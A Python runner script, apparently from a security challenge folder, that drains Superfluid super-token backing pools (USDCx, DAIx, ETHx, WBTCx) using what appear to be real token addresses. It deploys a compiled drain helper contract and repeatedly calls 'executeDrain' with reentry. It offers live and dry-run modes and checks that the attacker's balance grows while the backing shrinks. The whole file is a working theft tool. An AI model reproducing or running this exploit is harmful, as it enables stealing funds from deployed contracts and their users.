#!/usr/bin/env python3
import json
import os
import pathlib
import subprocess
import sys
from datetime import datetime, timezone


ROOT = pathlib.Path("/Users/dldustn/Desktop/AssignmentC")
CH_DIR = ROOT / "challenges" / "ch5_superfluid_v2"
ARTIFACT_PATH = CH_DIR / "out" / "Run.s.sol" / "Ch5ERC20Drain.json"
LOG_PATH = CH_DIR / "runs" / "exploit_1776541658.log"
PREFLIGHT_PATH = CH_DIR / "runs" / "exploit_1776541658_preflight.json"
POSTFLIGHT_PATH = CH_DIR / "runs" / "exploit_1776541658_postflight.json"

ROUTER = "0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff"

PUBLIC_ADDRESS = "0xc943edb4bb4439d65b81f2f60bc698411e910b14"
EXPECTED_PRE_NONCE = 63
EXPECTED_PRE_BALANCE = 824_821_305_986_490_837_101_959
EXPECTED_FINAL_BALANCE = 824_976_949_291_936_647_450_911

EXPECTED_BACKINGS = {
    "USDCx": 213_115_469,
    "DAIx": 68_790_958_826_895_477_962,
    "ETHx": 11_171_207_208_220_570,
    "WBTCx": 8_303,
}

STAGES = [
    {
        "label": "USDCx dust",
        "super_token": "0xCAa7349CEA390F89641fe306D93591f87595dc1F",
        "underlying": "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
        "index_base": 720_000_000,
        "bootstrap": 6_740_594_247_872_218_053,
        "max_reentry": 20,
    },
    {
        "label": "DAIx dust",
        "super_token": "0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2",
        "underlying": "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
        "index_base": 730_000_000,
        "bootstrap": 446_683_629_618_592_470,
        "max_reentry": 20,
    },
    {
        "label": "ETHx dust",
        "super_token": "0x27e1e4E6BC79D93032abef01025811B7E4727e85",
        "underlying": "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",
        "index_base": 735_000_000,
        "bootstrap": 1_264_114_195_392_727_712,
        "max_reentry": 20,
    },
    {
        "label": "WBTCx dust",
        "super_token": "0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92",
        "underlying": "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6",
        "index_base": 740_000_000,
        "bootstrap": 172_043_443_441_406_539,
        "max_reentry": 20,
    },
]


def run(cmd: list[str]) -> subprocess.CompletedProcess[str]:
    return subprocess.run(cmd, text=True, capture_output=True)


def log(line: str = "") -> None:
    with LOG_PATH.open("a") as fh:
        fh.write(line)
        if not line.endswith("\n"):
            fh.write("\n")


def require_ok(proc: subprocess.CompletedProcess[str], label: str) -> subprocess.CompletedProcess[str]:
    if proc.stdout:
        log(proc.stdout.rstrip())
    if proc.stderr:
        log(proc.stderr.rstrip())
    if proc.returncode != 0:
        raise RuntimeError(f"{label} command failed")
    return proc


def uint_from_hex_or_dec(text: str) -> int:
    value = text.strip()
    if value.startswith("0x"):
        return int(value, 16)
    return int(value.split()[0])


def balance(rpc: str, address: str) -> int:
    proc = require_ok(run(["cast", "balance", address, "--rpc-url", rpc]), f"balance {address}")
    return uint_from_hex_or_dec(proc.stdout)


def nonce(rpc: str, address: str) -> int:
    proc = require_ok(run(["cast", "nonce", address, "--rpc-url", rpc]), f"nonce {address}")
    return uint_from_hex_or_dec(proc.stdout)


def token_balance(rpc: str, token: str, holder: str) -> int:
    proc = require_ok(
        run(["cast", "call", token, "balanceOf(address)(uint256)", holder, "--rpc-url", rpc]),
        f"balanceOf {token}",
    )
    return uint_from_hex_or_dec(proc.stdout)


def receipt_or_die(raw: str, label: str) -> dict:
    receipt = json.loads(raw)
    if receipt.get("status") != "0x1":
        raise RuntimeError(f"{label} reverted")
    return receipt


def load_bytecode() -> str:
    artifact = json.loads(ARTIFACT_PATH.read_text())
    return artifact["bytecode"]["object"]


def deploy_contract(rpc: str, private_key: str, creation_bytecode: str, super_token: str, index_base: int) -> dict:
    encoded = require_ok(
        run(["cast", "abi-encode", "constructor(address,address,uint32)", super_token, ROUTER, str(index_base)]),
        "constructor encode",
    )
    init_code = creation_bytecode + encoded.stdout.strip()[2:]

    log(
        "$ cast send --gas-limit 4000000 --rpc-url "
        "$TARGET_RPC --private-key $PRIVATE_KEY --json --create <ch5erc20drain-init-code>"
    )
    proc = require_ok(
        run(
            [
                "cast",
                "send",
                "--gas-limit",
                "4000000",
                "--rpc-url",
                rpc,
                "--private-key",
                private_key,
                "--json",
                "--create",
                init_code,
            ]
        ),
        "deploy helper",
    )
    return receipt_or_die(proc.stdout, "deploy helper")


def send_execute(rpc: str, private_key: str, helper: str, bootstrap: int, max_reentry: int) -> dict:
    log(
        "$ cast send --gas-limit 15000000 --rpc-url "
        f"$TARGET_RPC --private-key $PRIVATE_KEY --json {helper} "
        f'"executeDrain(uint256,uint256)" 1 {max_reentry} --value '
        f"{bootstrap}"
    )
    proc = require_ok(
        run(
            [
                "cast",
                "send",
                "--gas-limit",
                "15000000",
                "--rpc-url",
                rpc,
                "--private-key",
                private_key,
                "--json",
                helper,
                "executeDrain(uint256,uint256)",
                "1",
                str(max_reentry),
                "--value",
                str(bootstrap),
            ]
        ),
        "executeDrain",
    )
    return receipt_or_die(proc.stdout, "executeDrain")


def gas_cost_wei(receipt: dict) -> int:
    gas_used = int(receipt["gasUsed"], 16)
    gas_price = int(receipt["effectiveGasPrice"], 16)
    return gas_used * gas_price


def stage_expected_label(label: str) -> str:
    if label.startswith("USDCx"):
        return "USDCx"
    if label.startswith("DAIx"):
        return "DAIx"
    if label.startswith("ETHx"):
        return "ETHx"
    return "WBTCx"


def main() -> int:
    live_rpc = os.environ["RPC_CH5_SUPERFLUID_V2"]
    target_rpc = os.environ.get("TARGET_RPC", live_rpc)
    private_key = os.environ["PRIVATE_KEY"]

    LOG_PATH.write_text("")
    mode = "live" if target_rpc == live_rpc else "dry-run"
    log(f"=== exploit_1776541658 {datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')} ===")
    log(f"manual dust continuation from the current stable ch5 head ({mode})")
    if PREFLIGHT_PATH.exists():
        log(PREFLIGHT_PATH.read_text())

    pre_nonce = nonce(target_rpc, PUBLIC_ADDRESS)
    pre_balance = balance(target_rpc, PUBLIC_ADDRESS)
    usdc_backing = token_balance(target_rpc, "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", "0xCAa7349CEA390F89641fe306D93591f87595dc1F")
    dai_backing = token_balance(target_rpc, "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", "0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2")
    eth_backing = token_balance(target_rpc, "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", "0x27e1e4E6BC79D93032abef01025811B7E4727e85")
    wbtc_backing = token_balance(target_rpc, "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", "0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92")

    log(f"$ cast nonce $PUBLIC_ADDRESS --rpc-url $TARGET_RPC\n{pre_nonce}")
    log(f"$ cast balance $PUBLIC_ADDRESS --rpc-url $TARGET_RPC\n{pre_balance}")
    log(f"USDCx backing pre: {usdc_backing}")
    log(f"DAIx backing pre: {dai_backing}")
    log(f"ETHx backing pre: {eth_backing}")
    log(f"WBTCx backing pre: {wbtc_backing}")

    if pre_nonce != EXPECTED_PRE_NONCE:
        raise RuntimeError(f"unexpected nonce {pre_nonce}, expected {EXPECTED_PRE_NONCE}")
    if pre_balance != EXPECTED_PRE_BALANCE:
        raise RuntimeError(f"unexpected balance {pre_balance}, expected {EXPECTED_PRE_BALANCE}")
    if usdc_backing != EXPECTED_BACKINGS["USDCx"]:
        raise RuntimeError(f"unexpected USDCx backing {usdc_backing}")
    if dai_backing != EXPECTED_BACKINGS["DAIx"]:
        raise RuntimeError(f"unexpected DAIx backing {dai_backing}")
    if eth_backing != EXPECTED_BACKINGS["ETHx"]:
        raise RuntimeError(f"unexpected ETHx backing {eth_backing}")
    if wbtc_backing != EXPECTED_BACKINGS["WBTCx"]:
        raise RuntimeError(f"unexpected WBTCx backing {wbtc_backing}")

    creation_bytecode = load_bytecode()
    tx_hashes: list[str] = []
    total_gas_cost = 0

    try:
        for stage in STAGES:
            before_native = balance(target_rpc, PUBLIC_ADDRESS)
            before_backing = token_balance(target_rpc, stage["underlying"], stage["super_token"])

            log(stage["label"])
            log(f"underlying backing before: {before_backing}")
            log(f"bootstrap native: {stage['bootstrap']}")

            create_receipt = deploy_contract(
                target_rpc,
                private_key,
                creation_bytecode,
                stage["super_token"],
                stage["index_base"],
            )
            helper = create_receipt["contractAddress"]
            tx_hashes.append(create_receipt["transactionHash"])
            total_gas_cost += gas_cost_wei(create_receipt)
            log(f"drain helper: {helper}")

            call_receipt = send_execute(
                target_rpc,
                private_key,
                helper,
                stage["bootstrap"],
                stage["max_reentry"],
            )
            tx_hashes.append(call_receipt["transactionHash"])
            total_gas_cost += gas_cost_wei(call_receipt)

            after_native = balance(target_rpc, PUBLIC_ADDRESS)
            after_backing = token_balance(target_rpc, stage["underlying"], stage["super_token"])

            log(f"token native delta: {after_native - before_native}")
            log(f"underlying backing final: {after_backing}")

            if after_native <= before_native:
                raise RuntimeError(f"{stage['label']} did not increase native balance")
            if after_backing >= before_backing:
                raise RuntimeError(f"{stage['label']} did not reduce backing")

        post_balance = balance(target_rpc, PUBLIC_ADDRESS)
        post_nonce = nonce(target_rpc, PUBLIC_ADDRESS)
        summary = {
            "mode": mode,
            "pre_balance_wei": str(pre_balance),
            "post_balance_wei": str(post_balance),
            "actual_delta_wei": str(post_balance - pre_balance),
            "gas_cost_wei": str(total_gas_cost),
            "post_nonce": str(post_nonce),
            "tx_hashes": tx_hashes,
        }

        log(f"$ cast nonce $PUBLIC_ADDRESS --rpc-url $TARGET_RPC\n{post_nonce}")
        log(f"$ cast balance $PUBLIC_ADDRESS --rpc-url $TARGET_RPC\n{post_balance}")
        log(json.dumps(summary, indent=2))

        if target_rpc == live_rpc:
            postflight = {
                "post_balance_wei": str(post_balance),
                "actual_delta_wei": str(post_balance - pre_balance),
                "tx_hash": tx_hashes[-1] if tx_hashes else "",
                "tx_hashes": tx_hashes,
                "gas_cost_wei": str(total_gas_cost),
                "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
                "notes": "Manual current-head dust continuation after exploit_1776541229 stabilized. Parameters come from the passing Attempt52 live-head dry-run.",
            }
            POSTFLIGHT_PATH.write_text(json.dumps(postflight, indent=2) + "\n")

        print(json.dumps(summary, indent=2))
        if post_balance + total_gas_cost < EXPECTED_FINAL_BALANCE:
            return 2
        return 0
    except Exception as exc:
        current_balance = balance(target_rpc, PUBLIC_ADDRESS)
        current_nonce = nonce(target_rpc, PUBLIC_ADDRESS)
        failure = {
            "mode": mode,
            "error": str(exc),
            "pre_balance_wei": str(pre_balance),
            "current_balance_wei": str(current_balance),
            "current_delta_wei": str(current_balance - pre_balance),
            "gas_cost_wei": str(total_gas_cost),
            "current_nonce": str(current_nonce),
            "tx_hashes": tx_hashes,
        }
        log(json.dumps(failure, indent=2))
        print(json.dumps(failure, indent=2))
        return 1


if __name__ == "__main__":
    sys.exit(main())
